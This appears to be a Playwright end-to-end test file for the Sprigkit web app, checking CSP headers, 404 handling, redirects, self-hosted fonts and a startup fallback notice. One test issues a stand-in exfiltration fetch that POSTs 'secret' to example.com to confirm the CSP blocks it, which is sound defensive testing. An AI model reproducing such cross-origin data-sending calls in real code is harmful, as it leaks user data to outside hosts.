import { expect, expectNoA11yViolations, test } from "./fixtures";

test("homepage renders under the CSP without errors", async ({ page }) => {
  const response = await page.goto("/");
  expect(response?.status()).toBe(200);
  expect(response?.headers()["content-security-policy"]).toContain(
    "connect-src 'self' blob: data:",
  );
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Sprigkit");
  await expectNoA11yViolations(page);
});

test("unknown URLs return the 404 page", async ({ page }) => {
  const response = await page.goto("/does-not-exist");
  expect(response?.status()).toBe(404);
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Page not found");
  await expectNoA11yViolations(page);
});

test("clean URLs: /index.html redirects to /", async ({ page }) => {
  await page.goto("/index.html");
  expect(new URL(page.url()).pathname).toBe("/");
});

test("fonts are self-hosted", async ({ page, noNetwork }) => {
  await page.goto("/");
  await page.evaluate(() => document.fonts.ready);
  const fonts = noNetwork.requests.filter((url) => url.endsWith(".woff2"));
  expect(fonts.length).toBeGreaterThan(0);
});

test("CSP blocks fetch() to another origin", async ({ page, csp, noNetwork }) => {
  csp.allowViolations();
  await page.goto("/");
  const result = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/upload", { method: "POST", body: "secret" });
      return "sent";
    } catch {
      return "blocked";
    }
  });
  expect(result).toBe("blocked");
  await expect
    .poll(async () => (await csp.violations()).map((v) => v.violatedDirective))
    .toContain("connect-src");
  expect(noNetwork.requests.some((url) => url.startsWith("https://example.com"))).toBe(false);
});

test("the startup notice stays hidden when the app runs", async ({ page }) => {
  await page.goto("/merge-pdf");
  await expect(page.locator("html")).toHaveAttribute("data-app-started", "");
  await expect(page.locator("#startup-notice")).toBeHidden();
});

test("the startup notice appears when the app's scripts can't run", async ({ page }) => {
  // What an outdated phone browser experiences: the scripts fail.
  await page.route("**/_next/static/chunks/**", (route) => route.abort());
  await page.goto("/merge-pdf");
  await expect(page.getByText("Sprigkit’s tools couldn’t start in this browser")).toBeVisible();
});
